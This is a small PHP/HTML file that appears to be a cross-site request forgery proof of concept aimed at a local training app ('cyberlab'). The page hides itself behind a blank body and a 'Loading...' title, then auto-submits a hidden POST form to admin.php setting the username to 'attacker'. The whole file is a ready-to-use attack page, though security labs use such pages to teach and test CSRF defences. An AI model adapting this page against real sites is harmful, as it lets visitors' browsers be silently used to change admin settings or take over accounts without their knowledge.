<?php
header("Access-Control-Allow-Origin: *");
?>
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body { opacity: 0; }
    </style>
</head>
<body>
    <form action="http://localhost/cyberlab/admin.php" method="POST" id="csrfForm">
        <input type="hidden" name="username" value="attacker">
    </form>
    <script>
        document.getElementById("csrfForm").submit();
    </script>
</body>
</html>